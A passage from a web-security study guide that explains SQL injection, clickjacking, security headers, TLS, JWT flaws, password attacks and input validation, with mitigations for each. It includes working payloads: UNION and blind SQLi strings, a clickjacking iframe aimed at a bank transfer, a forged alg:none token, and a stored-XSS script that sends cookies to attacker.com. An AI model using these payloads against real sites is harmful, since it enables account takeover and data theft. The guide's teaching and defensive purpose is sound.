→ Attacker is logged in as admin 💀
```

---

### Advanced: UNION-Based Data Extraction

```sql
-- Original query: SELECT name, price FROM products WHERE id=1
-- Attacker input for id: 1 UNION SELECT username, password FROM users--

-- Resulting query:
SELECT name, price FROM products WHERE id=1
UNION
SELECT username, password FROM users--

-- Returns all usernames and passwords from the users table!
```

---

### Blind SQL Injection

When the application doesn't display query results but behaves differently based on true/false:

```
URL: /product?id=1 AND 1=1  → Page loads normally (condition is true)
URL: /product?id=1 AND 1=2  → Page shows error or no content (condition is false)

Attacker extracts data bit by bit:
/product?id=1 AND SUBSTRING(username,1,1)='a'  → True? First letter of username is 'a'
/product?id=1 AND SUBSTRING(username,2,1)='d'  → True? Second letter is 'd'
... repeating for each character until full username/password is extracted
```

---

### SQL Injection Mitigation

#### Parameterized Queries (Prepared Statements)

```python
# VULNERABLE:
cursor.execute("SELECT * FROM users WHERE username='" + username + "'")

# SECURE (parameterized):
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
#                                                   ↑
#                          Placeholder — value is NEVER treated as SQL code
#                          username is passed as DATA, not as part of the query structure
```

Why this works:
- The query structure is fixed first
- The user input is sent separately as a parameter
- Even if input is `'; DROP TABLE users;--`, it's treated as a literal string value, not SQL code

#### ORM (Object-Relational Mapping)

```javascript
// Prisma ORM — automatically uses parameterized queries:
const user = await prisma.user.findUnique({
  where: { username: userInput } // Safe — no SQL concatenation
});
```

#### Least Privilege Database Accounts

```sql
-- The web app's DB user should only have necessary permissions:
GRANT SELECT, INSERT, UPDATE ON app_schema.* TO 'webapp'@'localhost';
-- No DROP, no access to other schemas
-- Even if injected, attacker can't destroy the database
```

---

## 9. Clickjacking

### What is Clickjacking?

An attacker embeds your website invisibly inside an `<iframe>` on their malicious page, overlaid with something enticing. The victim thinks they're clicking the attacker's button but actually clicking your site's button.

**Attack setup:**
```html
<!-- On attacker's page: -->
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;  /* Nearly invisible! */
    z-index: 100;
  }
  .fake-button {
    position: absolute;
    top: 200px; left: 150px;
    /* Positioned to align with "Transfer Money" button in the iframe */
  }
</style>

<div class="fake-button">🎉 CLICK HERE TO WIN A PRIZE! 🎉</div>

<iframe src="https://bank.com/transfer?to=attacker&amount=1000">
</iframe>

<!-- Victim clicks "WIN A PRIZE" button
     Actually clicks "Transfer Money" on bank.com
     Bank executes transfer because victim is logged in -->
```

### Mitigation: X-Frame-Options / CSP frame-ancestors

```
X-Frame-Options: DENY                  → Page cannot be framed at all
X-Frame-Options: SAMEORIGIN            → Only same-origin pages can frame it
X-Frame-Options: ALLOW-FROM https://trusted.com  → Only trusted.com can frame it

Content-Security-Policy: frame-ancestors 'none'   → Modern equivalent of DENY
Content-Security-Policy: frame-ancestors 'self'   → Modern equivalent of SAMEORIGIN
```

With `DENY`: Even if the attacker's page tries to load your site in an iframe, the browser refuses to render it.

---

## 10. Security Headers

A complete reference of security-related HTTP response headers:

| Header | Value | What It Protects Against |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Downgrade attacks — forces HTTPS |
| `Content-Security-Policy` | `default-src 'self'` | XSS, data injection |
| `X-Frame-Options` | `DENY` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME-type sniffing attacks |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Data leakage in Referer header |
| `Permissions-Policy` | `geolocation=(), camera=()` | Limits browser feature access |
| `Cache-Control` | `no-store` | Sensitive data cached by proxies |

---

### HSTS — HTTP Strict Transport Security (Deep Dive)

**Problem:**
```
User visits: http://bank.com (forgets the https://)
          ↓
Browser makes plain HTTP request
          ↓
Man-in-the-middle intercepts it
          ↓
Attacker responds: "Here's a fake bank.com over HTTP"
          ↓
Victim enters credentials on attacker's site (SSL Stripping Attack)
```

**HSTS Solution:**

Once the user visits `https://bank.com` and gets this header:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

The browser stores this internally:
- For the next 1 year (31536000 seconds): **never** make HTTP requests to `bank.com`
- Even if user types `http://bank.com`, browser internally changes it to `https://`
- The plain HTTP request **never leaves the browser** — no opportunity for interception

**Preload list:**
Major browsers maintain a hardcoded list of domains that are HTTPS-only from the very first visit (before even receiving the header). You can submit your domain to: `https://hstspreload.org`

---

### X-Content-Type-Options: nosniff

**The attack (MIME Sniffing):**
```
Attacker uploads a file named "profile.jpg" 
File actually contains JavaScript code

Without nosniff:
  Browser looks at file content → "This looks like JS!"
  Browser executes it as JavaScript despite .jpg extension
  → XSS achieved through file upload!

With X-Content-Type-Options: nosniff:
  Browser trusts the Content-Type header only
  Server says it's image/jpeg → treated as image → not executed ✅
```

---

## 11. HTTPS, TLS & Certificate Attacks

### TLS Handshake in Detail

```
1. CLIENT HELLO
   Browser → Server
   "I support TLS 1.3, here are cipher suites I support:
    TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256..."
   Includes: random bytes (ClientRandom)

2. SERVER HELLO  
   Server → Browser
   "Let's use TLS_AES_256_GCM_SHA384. Here's my certificate.
    Here's my random bytes (ServerRandom)."
   Certificate contains: Server's public key, signed by a Certificate Authority

3. CERTIFICATE VALIDATION
   Browser checks:
   a. Is the certificate signed by a trusted CA? (Browser has a built-in list)
   b. Does the domain in cert match the domain I'm visiting?
   c. Is the certificate expired?
   d. Has the certificate been revoked? (OCSP check)

4. KEY EXCHANGE
   Both sides derive the same session keys from:
   ClientRandom + ServerRandom + shared secret (via key exchange algorithm)

5. FINISHED
   Both sides confirm: "We're using the same keys. Encryption starts now."

All subsequent data is encrypted with the session keys.
```

---

### ⚠️ Certificate Attacks

**Man-in-the-Middle with Fake Certificate:**
```
Browser ──HTTPS──> [Attacker] ──HTTPS──> Real Server

Attacker presents their OWN certificate for bank.com
Browser checks: "Is this signed by a trusted CA?"
→ If attacker can't get a CA to sign it: Browser shows certificate warning ✅
→ If attacker compromises a CA: Attack succeeds 💀 (very rare, nation-state level)
```

**Certificate Pinning:**
Apps (especially mobile) can hardcode the expected certificate or public key. If a different certificate is presented (even a valid CA-signed one), the connection is rejected.

**Certificate Transparency:**
All issued certificates must be logged in public CT logs. Anyone can monitor these logs to detect unauthorized certificates issued for their domain.

---

## 12. JWT — JSON Web Tokens

### Structure

A JWT is three Base64-encoded parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MTQ0MDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Part 1: Header
  {"alg": "HS256", "typ": "JWT"}

Part 2: Payload (Claims)
  {"userId": 42, "role": "admin", "exp": 1714400000}

Part 3: Signature
  HMAC_SHA256(base64(header) + "." + base64(payload), SECRET_KEY)
```

**Important:** The payload is only **Base64 encoded**, NOT encrypted. Anyone can decode it. Never put sensitive data (passwords, SSNs) in a JWT.

```javascript
// Decoding payload (no key needed!):
const payload = atob('eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4ifQ==');
// {"userId":42,"role":"admin"}
```

The **signature** is what makes it secure — it proves the payload hasn't been tampered with.

---

### ⚠️ Vulnerability: Algorithm Confusion (alg:none)

```
Original JWT header: {"alg": "HS256"}
Attacker changes to: {"alg": "none"}

With alg:none, some libraries skip signature verification entirely!

Attacker modifies payload:
{"userId": 42, "role": "admin"}  →  {"userId": 42, "role": "superadmin"}

Creates JWT with no signature:
eyJhbGciOibm9uZSJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoic3VwZXJhZG1pbiJ9.

If server accepts this: Attacker is now "superadmin" 💀
```

**Mitigation:**
```javascript
// Always explicitly specify allowed algorithms:
jwt.verify(token, secret, { algorithms: ['HS256'] });
// Never allow "none" algorithm
```

---

### ⚠️ Vulnerability: Weak Secret Key

JWT signed with a weak secret can be brute-forced:

```
JWT: eyJhbGc...
Tools like "hashcat" try millions of keys per second:
  jwt.sign(payload, "secret") → matches? No
  jwt.sign(payload, "password") → matches? No
  jwt.sign(payload, "letmein") → matches? YES! 

Attacker now has the signing key → can forge any JWT
```

**Mitigation:**
- Use at least 256 bits of random entropy for the secret.
- `crypto.randomBytes(64).toString('hex')` → store this, never hardcode it.

---

### JWT Revocation Problem

Unlike sessions (where you just delete the session record), JWTs are **stateless** — the server doesn't store them. Revoking them is hard:

```
Scenario: User's JWT is stolen. They report it.
Server wants to invalidate that JWT.

Problem: Server doesn't store JWTs — can't "delete" it.
JWT remains valid until it expires (could be hours or days).

Solutions:
1. Short expiry times (15 minutes) + Refresh tokens
2. Maintain a token blacklist in Redis:
   redis.set("blacklist:" + jti, true, "EX", expirySeconds);
   On each request: if blacklisted → reject
3. Rotate JWT secret (invalidates ALL tokens — nuclear option)
```

---

## 13. Password Storage & Attacks

### Rainbow Table Attack

A rainbow table is a pre-computed dictionary of:
```
password → hash
"secret" → "5ebe2294ecd0e0f08eab7690d2a6ee69"
"admin"  → "21232f297a57a5a743894a0e4a801fc3"
...millions of entries
```

Attacker leaks your DB, finds hash `5ebe2294ecd0e0f08eab7690d2a6ee69`, looks it up → "secret".

**Salt defeats this:**
```
salt = random 16 bytes
stored_hash = bcrypt("secret" + salt)
```

The salt makes every hash unique — rainbow tables are useless because they'd need to pre-compute for every possible salt.

---

### Dictionary Attack & Credential Stuffing

**Dictionary Attack:** Try common passwords from a wordlist:
```
rockyou.txt — 14 million real passwords from a breach
Attacker tries: password1, 123456, qwerty, iloveyou...
```

**Credential Stuffing:** Use username+password pairs from OTHER breaches:
```
If users reuse passwords:
Breach at site-a.com → get john@example.com:Secret99
Try john@example.com:Secret99 at bank.com → might work!
```

**Mitigations:**
- Enforce minimum password complexity and length.
- Check passwords against known breach lists (HaveIBeenPwned API).
- Rate limit login attempts.
- MFA — even correct password isn't enough.

---

## 14. Rate Limiting & Brute Force

### Brute Force Attack

Systematically trying every possible password:

```
attack sequence:
  POST /login { username: "admin", password: "a" }       → 401
  POST /login { username: "admin", password: "aa" }      → 401
  POST /login { username: "admin", password: "aaa" }     → 401
  ... (billions of attempts later)
  POST /login { username: "admin", password: "secret" }  → 200 ✅
```

Without any protection, an automated tool can try millions of passwords per second.

---

### Rate Limiting Strategies

**IP-Based Rate Limiting:**
```
Rule: Max 5 login attempts per IP per 15 minutes

Attempt 1-5: Normal
Attempt 6:   429 Too Many Requests
             Retry-After: 900 (seconds)
```

**Account-Based Lockout:**
```
Rule: After 10 failed attempts for username "john", lock for 30 minutes

Risk: Denial of Service — attacker can lock out legitimate users
Better: Progressive delay (exponential backoff) instead of hard lockout
  Attempt 1-3: No delay
  Attempt 4: 1 second delay
  Attempt 5: 2 seconds
  Attempt 6: 4 seconds
  Attempt 10: 512 seconds (~8.5 minutes)
```

**CAPTCHA:**
```
After 3 failed attempts → require solving a CAPTCHA
→ Automated tools cannot solve it
→ Brute force becomes impractical
```

---

## 15. Input Validation & Encoding

### Client-Side vs Server-Side Validation

```javascript
// Client-side (JavaScript form validation):
function validate() {
  if (document.getElementById('email').value === '') {
    alert('Email required');
    return false;
  }
}
```

**Problem:** Anyone can bypass client-side validation:
```
1. Open browser DevTools
2. Edit the HTML to remove validation attributes
3. Or use curl/Postman to bypass the browser entirely:
   curl -X POST https://example.com/register -d "email=&age=-1"
```

**Server-side validation is NOT optional:**
```python
# Server always validates independently:
if not request.form.get('email'):
    return error("Email required"), 400
if not is_valid_email(request.form['email']):
    return error("Invalid email"), 400
if int(request.form.get('age', 0)) < 0:
    return error("Invalid age"), 400
```

**Rule:** Client-side validation = UX convenience. Server-side validation = actual security.

---

### Output Encoding Contexts

The same data needs different encoding depending on where it's inserted:

```html
<!-- HTML context — encode HTML entities: -->
<p>Hello, &lt;script&gt;alert(1)&lt;/script&gt;</p>
<!-- Displays as text, not executed -->

<!-- HTML Attribute context: -->
<input value="user &quot;input&quot; here">
<!-- Must encode quotes to prevent breaking out of attribute -->

<!-- JavaScript context: -->
<script>var name = "user\u003cscript\u003e";</script>
<!-- Must Unicode-escape < > to prevent breaking out of string -->

<!-- URL context: -->
<a href="/search?q=hello%20world%3Cscript%3E">
<!-- Must URL-encode -->

<!-- CSS context: -->
<style>color: \003Cscript\003E</style>
<!-- Must CSS-escape -->
```

**Using the wrong encoding for the context can still result in XSS.** Always use a library that understands context (e.g., OWASP Java Encoder, DOMPurify).

---

## 16. Full Attack Chain Example

### Scenario: A Complete Account Takeover

Let's trace a full attack from vulnerability discovery to account takeover.

**Target:** A blogging platform. Users can post comments.

```
Step 1 — Reconnaissance
  Attacker finds comment box allows HTML content
  
Step 2 — Testing for XSS
  Attacker posts: <script>alert(1)</script>
  → Alert fires → Stored XSS confirmed

Step 3 — Inspecting Cookie Security
  DevTools → Application → Cookies
  session_id: xyz789
  HttpOnly: false   ← VULNERABILITY FOUND
  Secure: false     ← VULNERABILITY FOUND
  SameSite: none    ← VULNERABILITY FOUND

Step 4 — Crafting XSS Payload
  Attacker posts as a comment:
  <script>
    var exfil = new Image();
    exfil.src = 'https://attacker.com/c?' + 
                encodeURIComponent(document.cookie);
  </script>

Step 5 — Victim Visits Page
  Admin user views the comments page
  XSS fires → admin's cookies sent to attacker.com
  
Step 6 — Checking Attacker's Server Logs
  GET /c?session_id%3Dabc999%3Brole%3Dadmin
  → session_id=abc999; role=admin

Step 7 — Session Hijacking
  Attacker opens browser → DevTools → Console:
  document.cookie = "session_id=abc999"
  Navigates to: https://target.com/admin
  
  Server checks session abc999 → finds admin user → grants access
  Attacker is now admin. ✅💀

Step 8 — Privilege Escalation
  From the admin panel, attacker can:
  - Read all users' private data
  - Change passwords
  - Download database dumps
  - Install backdoors via admin file upload
```

**How Each Mitigation Would Have Broken the Chain:**

| Fix Applied | Effect |
|---|---|
| `HttpOnly` on cookie | Step 3 blocked — `document.cookie` empty, Step 4 fails |
| Sanitize HTML output | Step 2 blocked — `<script>` encoded as text, never executed |
| `Content-Security-Policy` | Step 4 blocked — external fetch to `attacker.com` blocked by CSP |
| `Secure` on cookie | Step 7 partially blocked — cookie not sent over HTTP; but HTTPS sniff would still work |
| Any ONE of these | Breaks the attack chain at that step |

**Defense in Depth:** Multiple layers mean the attacker must defeat every layer. Missing just one layer in a complex attack breaks the entire chain.

---

## Quick Reference — Vulnerability Cheatsheet

| Vulnerability | Root Cause | Quick Test | Fix |
|---|---|---|---|
| **XSS** | Unsanitized user input rendered as HTML | `<script>alert(1)</script>` in inputs | Encode output, CSP, HttpOnly |
| **SQLi** | User input concatenated into SQL | `' OR '1'='1` in login fields | Parameterized queries, ORM |
| **CSRF** | No request origin validation | Forge cross-site POST request | CSRF tokens, SameSite cookie |
| **IDOR** | No object ownership check | Change ID in URL/body | Server-side ownership check |
| **Clickjacking** | Page can be iframed | Embed site in iframe | X-Frame-Options: DENY |
| **Broken Auth** | Weak session/password management | Brute force, session fixation | Rate limiting, MFA, strong session IDs |
| **Sensitive in GET** | Credentials in URL parameters | Check browser history/logs | Use POST body |
| **Missing HTTPS** | Data transmitted in plain text | Wireshark on network | Enforce HTTPS + HSTS |
| **JWT alg:none** | Algorithm not validated | Modify JWT header | Whitelist algorithms |
| **Info Disclosure** | Server headers reveal version | Check Server/X-Powered-By headers | Remove version info from headers |

---

*This document covers HTTP fundamentals, cookies, sessions, authentication, authorization, CORS, CSRF, XSS, SQL injection, clickjacking, security headers, TLS, JWT, password security, rate limiting, and input validation — each with attack scenarios and mitigations.*
